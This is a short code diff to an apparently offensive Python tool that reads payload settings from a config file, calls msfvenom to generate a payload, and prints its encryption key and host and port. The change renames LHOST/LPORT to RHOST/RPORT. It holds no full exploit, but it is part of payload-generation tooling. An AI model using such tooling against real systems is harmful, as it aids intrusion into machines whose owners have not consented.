@@ -45,14 +45,14 @@ def main():
     else:
         ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
 
-    LHOST = config.get("Payload", "lhost") if is_set(config.get("Payload", "lhost")) else None
-    LPORT = config.getint("Payload", "lport") if is_set(config.get("Payload", "lport")) else None
+    RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
+    RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
     LURI = config.get("Payload", "luri") if is_set(config.get("Payload", "luri")) else None
 
 
     if is_set(config.get("Payload", "name")):
         PAYLOAD_NAME = config.get("Payload", "name")
-        msfvenom(PAYLOAD_NAME, LHOST, LPORT, LURI)
+        msfvenom(PAYLOAD_NAME, RHOST, RPORT, LURI)
         PAYLOAD_FILE = "payload.txt"
     else:
         print("No payload file or payload name specified")
@@ -61,8 +61,8 @@ def main():
     print("===========CONFIG==========")
     print(f"Encryption byte: {hex(ENCRYPTION_KEY)}")
     print(f"Payload : {PAYLOAD_FILE} {PAYLOAD_NAME}")
-    print(f"LHOST : {LHOST}")
-    print(f"LPORT : {LPORT}")
+    print(f"RHOST : {RHOST}")
+    print(f"RPORT : {RPORT}")
     print("===========================\n")
 
     print("===========PAYLOAD==============")
